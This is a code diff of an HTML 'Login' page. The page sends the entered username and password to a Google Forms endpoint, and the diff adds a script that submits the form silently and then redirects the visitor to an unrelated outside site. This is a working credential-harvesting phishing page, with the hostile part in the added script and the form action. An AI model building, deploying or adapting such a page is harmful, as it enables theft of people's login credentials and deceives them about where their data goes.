@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -38,13 +38,13 @@ input: hover,
 	opacity: 1;
 }
 
-input[type=submit] {
+input[type=button] {
 	background-color: navy;
 	color: white;
 	cursor: pointer;
 }
 
-input[type=submit]:hover {
+input[type=button]:hover {
 	background-color: lightgrey;
 }
 
@@ -110,7 +110,7 @@ input[type=submit]:hover {
 	<center><h1>   </h1></center>
 
 	<div class="container">
-		<form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeb9N8nHh2XIi1-Jo1KOF8vRElUMc90-TsS6t3X74FR3igg2g/formResponse" target="_self" method="POST">
+		<form id = "myForm" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeb9N8nHh2XIi1-Jo1KOF8vRElUMc90-TsS6t3X74FR3igg2g/formResponse" target="_self" method="POST">
 			<div class="row">
 				<h2 style="text-align:center">Login</h2>
 
@@ -121,7 +121,7 @@ input[type=submit]:hover {
 
 					<input type="text" name="entry.1040225934" placeholder="Username" required>
 					<input type="password" name="entry.1974653250" placeholder="Password" required>
-					<a href="file:///C:/Users/Dell/Desktop/Log%20in/p%20(86).jpg"><input type="submit" value="Log in"></a>
+					<a href="file:///C:/Users/Dell/Desktop/Log%20in/p%20(86).jpg"><input type="button" onclick = "redirectTo()" value="Log in"></a>
 
 				</div>
 
@@ -139,6 +139,12 @@ input[type=submit]:hover {
 	</div>
 	</div>
 </div>
-
+v
 </body>
+<script>
+function redirectTo() {
+	document.getElementById("myForm").submit();
+	window.location.replace("https://brajesh.simdif.com");
+}
+</script>
 </html>
